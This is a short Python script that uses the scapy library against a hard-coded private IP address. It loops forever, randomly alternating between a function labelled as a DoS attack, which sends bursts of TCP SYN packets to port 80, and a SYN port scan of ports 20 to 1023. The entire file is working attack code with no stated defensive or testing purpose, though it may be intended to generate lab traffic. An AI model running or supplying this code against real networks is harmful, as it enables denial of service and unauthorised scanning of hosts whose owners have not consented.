import scapy.all as scapy
import random
import time

target_ip = "192.168.1.74"  
 # Ensure this is correct!

def dos_attack():
    print("🚀 Sending DoS Attack...")
    packet = scapy.IP(dst=target_ip) / scapy.TCP(dport=80, flags="S")
    scapy.send(packet, count=100, verbose=True)  # <-- Added verbose=True

def port_scan():
    for port in range(20, 1024):
        print(f"🔍 Scanning Port {port}...")
        packet = scapy.IP(dst=target_ip) / scapy.TCP(dport=port, flags="S")
        scapy.send(packet, verbose=True)

while True:
    attack = random.choice([dos_attack, port_scan])
    attack()
    time.sleep(5)
